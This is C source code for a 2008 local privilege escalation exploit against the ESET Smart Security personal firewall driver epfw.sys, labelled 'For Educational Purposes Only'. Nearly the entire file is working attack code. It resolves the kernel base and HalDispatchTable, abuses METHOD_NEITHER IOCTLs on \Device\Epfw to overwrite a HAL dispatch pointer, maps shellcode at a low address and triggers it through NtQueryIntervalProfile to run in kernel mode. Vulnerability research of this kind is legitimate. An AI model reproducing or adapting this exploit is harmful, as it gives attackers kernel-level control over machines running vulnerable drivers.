////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | ESET, LLC. - http://www.eset.com/                                          | //
// |                                                                            | //
// | Affected Software:                                                         | //
// | ESET Smart Security <= 3.0.672                                             | //
// |                                                                            | //
// | Affected Driver:                                                           | //
// | Eset Personal Firewall driver - epfw.sys <= 3.0.672.0                      | //
// |                                                                            | //
// | Local Privilege Escalation Exploit                                         | //
// | For Educational Purposes Only !                                            | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NT Internals - http://www.ntinternals.org/                                 | //
// | alex ntinternals org                                                       | //
// | 18 December 2008                                                           | //
// |                                                                            | //
// | References:                                                                | //
// | Exploiting Common Flaws in Drivers                                         | //
// | Ruben Santamarta - http://reversemode.com/                                 | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "Epfw_Exp.h"
#include "InvbShellCode.h"

#define IOCTL_METHOD_NEITHER 0x8897229F
#define OUTPUT_BUFFER_LENGTH 0x04


int __cdecl main(int argc, char **argv)
{
    NTSTATUS NtStatus;

    HANDLE DeviceHandle;

    ULONG AllocationSize = PAGE_SIZE * 64;
    ULONG ImageBase;
    PVOID MappedBase;
    UCHAR ImageName[KERNEL_NAME_LENGTH];
    ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;

    PVOID HalDispatchTable;
    PVOID xHalQuerySystemInformation;

    ULONG ShellCodeSize = PAGE_SIZE;
    PVOID ShellCodeAddress;

    UNICODE_STRING DeviceName;
    UNICODE_STRING DllName;
    UNICODE_STRING DriverServiceName;
    ANSI_STRING ProcedureName;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    PSYSTEM_MODULE_INFORMATION_EX ModuleInformation = NULL;
    LARGE_INTEGER Interval;

    ///////////////////////////////////////////////////////////////////////////////////////////////

    system("cls");


    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(), // ProcessHandle
                                       &ModuleInformation, // BaseAddress
                                       0,                  // ZeroBits
                                       &AllocationSize,    // AllocationSize
                                       MEM_COMMIT,         // AllocationType
                                       PAGE_READWRITE);    // Protect

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [1] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtQuerySystemInformation(
                                        SystemModuleInformation, // SystemInformationClass
                                        ModuleInformation,       // SystemInformation
                                        AllocationSize,          // SystemInformationLength
                                        NULL);                   // ReturnLength

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQuerySystemInformation - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    ImageBase = (ULONG)(ModuleInformation->Modules[0].Base);


    RtlMoveMemory(
                  ImageName,
                  (PVOID)(ModuleInformation->Modules[0].ImageName +
                  ModuleInformation->Modules[0].ModuleNameOffset),
                  KERNEL_NAME_LENGTH);

    printf( " +----------------------------------------------------------------------------+\n"
            " | ImageBase - 0x%.8X                                                     |\n"
            " | ImageName - %s                                                   |\n",
            ImageBase,
            ImageName);


    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(), // ProcessHandle
                                   &ModuleInformation, // BaseAddress
                                   &AllocationSize,    // FreeSize
                                   MEM_DECOMMIT);      // FreeType

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtFreeVirtualMemory [1] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    RtlCreateUnicodeStringFromAsciiz(&DllName, (PUCHAR)ImageName);


    NtStatus = LdrLoadDll(
                          NULL,                // DllPath
                          &DllCharacteristics, // DllCharacteristics
                          &DllName,            // DllName
                          &MappedBase);        // DllHandle

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrLoadDll - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    RtlInitAnsiString(&ProcedureName, "HalDispatchTable");


    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,          // DllHandle
                                      &ProcedureName,             // ProcedureName
                                      0,                          // ProcedureNumber OPTIONAL
                                      (PVOID*)&HalDispatchTable); // ProcedureAddress

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)HalDispatchTable -= (ULONG)MappedBase;
    (ULONG)HalDispatchTable += ImageBase;

    (ULONG)xHalQuerySystemInformation = (ULONG)HalDispatchTable + sizeof(ULONG);

    printf( " |                                                                            |\n"
            " | HalDispatchTable - 0x%.8X                                              |\n"
            " | xHalQuerySystemInformation - 0x%.8X                                    |\n"
            " +----------------------------------------------------------------------------+\n",
            HalDispatchTable,
            xHalQuerySystemInformation);


    NtStatus = XxInitInbv(ImageBase, (ULONG)MappedBase);

	if(NtStatus)
	{
		printf(" [*] NtStatus of XxInitInbv - 0x%.8X\n", NtStatus);	
		return NtStatus;
	}

    RtlFreeUnicodeString(&DllName);
    RtlFreeAnsiString(&ProcedureName);

    LdrUnloadDll((PVOID)MappedBase);

    ///////////////////////////////////////////////////////////////////////////////////////////////

    RtlInitUnicodeString(&DeviceName, L"\\Device\\Epfw");

    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjectAttributes.RootDirectory = 0;
    ObjectAttributes.ObjectName = &DeviceName;
    ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
    ObjectAttributes.SecurityDescriptor = NULL;
    ObjectAttributes.SecurityQualityOfService = NULL;

    NtStatus = NtCreateFile(
                            &DeviceHandle,                      // FileHandle
                            FILE_READ_DATA | FILE_WRITE_DATA,   // DesiredAccess
                            &ObjectAttributes,                  // ObjectAttributes
                            &IoStatusBlock,                     // IoStatusBlock
                            NULL,                               // AllocationSize OPTIONAL
                            0,                                  // FileAttributes
                            FILE_SHARE_READ | FILE_SHARE_WRITE, // ShareAccess
                            FILE_OPEN_IF,                       // CreateDisposition
                            0,                                  // CreateOptions
                            NULL,                               // EaBuffer OPTIONAL
                            0);                                 // EaLength

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtCreateFile - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    RtlFreeUnicodeString(&DeviceName);

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtDeviceIoControlFile(
                                     DeviceHandle,               // FileHandle
                                     NULL,                       // Event
                                     NULL,                       // ApcRoutine
                                     NULL,                       // ApcContext
                                     &IoStatusBlock,             // IoStatusBlock
                                     IOCTL_METHOD_NEITHER,       // IoControlCode
                                     NULL,                       // InputBuffer
                                     0,                          // InputBufferLength
                                     xHalQuerySystemInformation, // OutputBuffer
                                     OUTPUT_BUFFER_LENGTH);      // OutBufferLength

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtDeviceIoControlFile [1] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }


    NtStatus = NtDeviceIoControlFile(
                                     DeviceHandle,
                                     NULL,
                                     NULL,
                                     NULL,
                                     &IoStatusBlock,
                                     IOCTL_METHOD_NEITHER,
                                     NULL,
                                     0,
                                     (PVOID)((ULONG)xHalQuerySystemInformation - sizeof(USHORT)),
                                     OUTPUT_BUFFER_LENGTH);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtDeviceIoControlFile [2] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    ShellCodeAddress = (PVOID)sizeof(ULONG);


    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),
                                       &ShellCodeAddress,
                                       0,
                                       &ShellCodeSize,
                                       MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
                                       PAGE_EXECUTE_READWRITE);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [2] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    RtlMoveMemory(ShellCodeAddress, (PVOID)InbvShellCode, ShellCodeSize);

    ///////////////////////////////////////////////////////////////////////////////////////////////

    Interval.LowPart = 0xFF676980;
    Interval.HighPart = 0xFFFFFFFF;

    printf("\n 3");
    NtDelayExecution(FALSE, &Interval);

    printf(" 2");
    NtDelayExecution(FALSE, &Interval);

    printf(" 1");
    NtDelayExecution(FALSE, &Interval);

    printf(" Hoop\n\n");
    NtDelayExecution(FALSE, &Interval);


    NtStatus = NtQueryIntervalProfile(
                                      ProfileTotalIssues, // Source
                                      NULL);              // Interval

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQueryIntervalProfile - 0x%.8X\n", NtStatus);
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtClose(DeviceHandle); // Handle

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtClose - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    return FALSE;
}